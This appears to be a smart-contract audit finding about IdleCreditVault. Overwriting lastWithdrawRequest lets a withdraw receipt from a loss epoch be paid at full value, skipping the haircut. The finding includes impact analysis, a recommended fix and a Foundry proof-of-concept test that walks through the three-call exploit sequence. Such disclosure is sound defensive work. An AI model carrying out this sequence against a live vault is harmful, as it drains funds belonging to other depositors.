### Title
Loss-adjusted withdraw receipts are paid at par if the user re-requests after the loss epoch (`lastWithdrawRequest` overwrite skips `lossRecoveryPriceByEpoch` haircut) - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault._claimLossAdjustedWithdrawRequest` applies the `stopEpochWithDuration` loss haircut only for the epoch stored in `lastWithdrawRequest[_user]`. Because `requestWithdraw` overwrites `lastWithdrawRequest[_user]` with the current epoch while the old per-epoch basis (`withdrawsRequestsByEpoch[_user][lossEpoch]` and the aggregate `withdrawsRequests[_user]`) is never cleared, a user who had a receipt in a loss-adjusted epoch and later files any new withdraw request gets the entire aggregate — including the defaulted-loss portion — paid at par via `_claimFundedWithdrawRequest`. The strategy only ever received the haircut amount for that epoch, so the excess is stolen from underlying that backs active LPs and other claimants.

### Finding Description
The bug lives in the claim routing of `IdleCreditVault.claimWithdrawRequest` (contracts/strategies/idle/IdleCreditVault.sol:301-350).

1. During a buffer phase, a user calls `IdleCDOEpochVariant.requestWithdraw`, which calls `IdleCreditVault.requestWithdraw`. This mints the user a strategy-token receipt and records `withdrawsRequests[_user] += _amount`, `withdrawsRequestsByEpoch[_user][epochNumber] += _amount`, and `lastWithdrawRequest[_user] = epochNumber` (lines 271-295).
2. The manager calls `stopEpochWithDuration` with a realized loss. The CDO calls `collectWithdrawFunds(_amount)` with `_amount < pendingWithdraws`; the strategy stores `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis`, zeroes `pendingWithdraws`, and pulls **only** the haircut amount of underlying (lines 411-429).
3. In the next buffer phase the same user calls `requestWithdraw` again (any amount). `requestWithdraw` adds to `withdrawsRequestsByEpoch[_user][newEpoch]` and — critically — overwrites `lastWithdrawRequest[_user] = newEpoch` (line 282). The epoch-N basis is still inside `withdrawsRequests[_user]` and `withdrawsRequestsByEpoch[_user][N]`.
4. After the next `stopEpoch`, the user calls `claimWithdrawRequest`. `_claimLossAdjustedWithdrawRequest` (lines 789-801) reads `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`, i.e. it looks up epoch N+1 — which has `lossRecoveryPrice == 0` — and returns 0 without clearing anything.
5. `_claimFundedWithdrawRequest` (lines 319-350) then pays `withdrawsRequests[_user]` in full — the epoch-N receipt at par instead of at `lossRecoveryPrice` — through `_transferFundedClaim`, which only checks that the transfer doesn't touch `defaultRecoveryReserve` (lines 901-906). The strategy holds `r·X + Y` but pays `X + Y`.

The invariant broken is "one receipt one payout at its epoch's recovery price": `collectWithdrawFunds` funded pending receipts only up to the stored recovery price, but the claim path's reliance on a single `lastWithdrawRequest` slot lets an old haircut receipt ride along in the aggregate payout. `_clearWithdrawClaimForEpoch` is never invoked for epoch N on this path, so `withdrawsRequestsByEpoch[_user][N]` and the aggregate are never decremented by the haircut.

### Impact Explanation
Direct theft / insolvency. The attacker extracts `(1 - lossRecoveryPrice) · X` underlying that was never funded by the borrower. Those underlyings are the strategy's general funded-claim / active-LP backing, so either later claimants or the CDO's active tranche holders absorb the shortfall (the vault becomes insolvent for the unpaid remainder). With a 50% recovery price on a large request, the attacker effectively doubles the stolen share; there is no cap — the attacker can size `X` to most of `pendingWithdraws` in the loss epoch. Loss equals `(1 - recoveryPrice) × attackerReceiptBasis`, i.e. up to nearly the full unfunded loss amount of that epoch.

### Likelihood Explanation
Fully unprivileged: the attacker only needs to be a KYC-passing lender able to call `requestWithdraw`. Preconditions are a `stopEpochWithDuration` stop that realizes a loss with pending receipts (an honest manager action the attacker sequences around, not attacker-controlled), followed by any later epoch. The attacker performs three ordinary user calls — `requestWithdraw` (epoch N buffer), `requestWithdraw` (epoch N+1 buffer), `claimWithdrawRequest` (after the next stop). No guard stops it: `_skimDonatedAssets` is irrelevant, `defaulted` stays false (a loss stop is not a default), `defaultRecoveryInitialized` is set on the loss path, and `_transferFundedClaim`'s reserve check doesn't apply pre-default. The flow is deterministic and repeatable on every loss-adjusted epoch.

### Recommendation
In `requestWithdraw`, before overwriting `lastWithdrawRequest[_user]`, settle any existing receipt from a loss-adjusted or defaulted epoch (i.e. run the `_claimLossAdjustedWithdrawRequest` / `_claimDefaultedWithdrawRequest` logic for the old epoch, or revert and force the user to claim first). Alternatively, make `_claimFundedWithdrawRequest` iterate all epochs with `lossRecoveryPriceByEpoch[epoch] != 0` (or `<= lastWithdrawRequest` markers) and apply per-epoch haircuts instead of paying the raw aggregate. A minimal fix: in `_claimLossAdjustedWithdrawRequest`, scan/clear the user's earliest unfunded request epoch rather than only `lastWithdrawRequest[_user]`, so a later request cannot shadow an earlier haircut.

### Proof of Concept
Foundry fork PoC (test contract pattern as in `test/foundry/IdleCreditVault.t.sol`):

```solidity
function testPocLossReceiptPaidAtPar() external {
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, 0);
    address attacker = makeAddr('attacker');
    uint256 amount = 10_000 * ONE_SCALE;
    _depositWithUser(attacker, amount, true);       // AA deposit, KYC'd
    idleCDO.depositAA(amount);                       // keep pool solvent

    // Buffer of epoch 0: attacker files withdraw request
    vm.prank(attacker);
    uint256 receiptN = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // Epoch 0 runs; borrower repays with a 50% loss -> lossRecoveryPriceByEpoch[0] = 0.5e18
    _startEpochAndCheckPrices(0);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pendingBasis = IdleCreditVault(address(strategy)).pendingWithdraws();
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(initialProvidedApr, pendingBasis / 2, 3 days, 0);
    assertGt(IdleCreditVault(address(strategy)).lossRecoveryPriceByEpoch(0), 0);

    // Buffer of epoch 1: attacker files a second tiny request, overwriting lastWithdrawRequest
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(1, address(AAtranche));

    // Epoch 1 runs cleanly, fully funding the new receipt
    deal(defaultUnderlying, borrower, _expectedFundsEndEpoch());
    _startEpochAndCheckPrices(1);
    _stopEpochAndCheckPrices(1, initialProvidedApr, _expectedFundsEndEpoch());

    // Attacker claims: _claimLossAdjustedWithdrawRequest looks up epoch 1 (no haircut),
    // _claimFundedWithdrawRequest pays the whole aggregate at par.
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = IERC20Detailed(defaultUnderlying).balanceOf(attacker) - balPre;

    // Expected honest payout: receiptN * 0.5 + tiny receipt; actual: receiptN + tiny receipt.
    assertGt(paid, receiptN * IdleCreditVault(address(strategy)).lossRecoveryPriceByEpoch(0) / 1e18 + 1,
        'epoch-0 loss haircut bypassed');
}
```

The assert shows the payout exceeds the haircut-adjusted basis, with the difference drained from strategy-held underlyings backing other users.